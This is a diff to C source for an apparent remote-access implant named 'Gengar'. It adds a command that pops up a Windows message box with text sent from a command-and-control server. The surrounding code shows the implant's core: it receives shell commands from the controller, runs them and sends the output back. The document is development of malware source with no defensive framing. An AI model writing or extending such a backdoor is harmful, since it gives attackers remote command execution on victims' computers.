@@ -1,13 +1,15 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <windows.h>
 
 #include "client.h"
 #include "shell.h"
 
 #define CMDTYPE_BUFSIZE 1
+#define MSGBOX_BUFSIZE 128
 #define SHELL_BUFSIZE 4096
 
-enum cmdtypes { shell };
+enum cmdtypes { shell, msgbox };
 
 void handle_shell() {
   char *cmd, *out;
@@ -17,6 +19,13 @@ void handle_shell() {
   free(cmd);
   sendtocnc(out);
   free(out);
+}
+
+void handle_msgbox() {
+  char *msg;
+  msg = recvfromcnc(MSGBOX_BUFSIZE);
+  MessageBox(NULL, msg, "Gengar Says", 0);
+  free(msg);
 }
 
 void startagent() {
@@ -30,6 +39,9 @@ void startagent() {
     switch (cmdtype) {
       case shell:
         handle_shell();
+        break;
+      case msgbox:
+        handle_msgbox();
         break;
     }
   }
